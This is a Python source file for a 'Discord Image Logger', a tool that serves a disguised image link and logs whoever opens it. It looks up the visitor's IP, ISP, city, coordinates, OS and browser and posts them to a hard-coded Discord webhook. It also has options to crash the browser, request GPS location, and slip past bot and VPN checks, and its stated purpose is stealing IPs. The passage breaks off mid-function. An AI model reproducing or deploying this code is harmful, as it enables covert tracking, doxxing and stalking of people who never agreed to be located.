# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1199592121146024036/q9z4Af6cxoaBzxbm9OEc6IiJ200v6sO7se1mzjVILrQgTeV-TgXMBcJXQAFBbyBQ3yiE",
"image": "data:image/jpeg;base64,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"                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
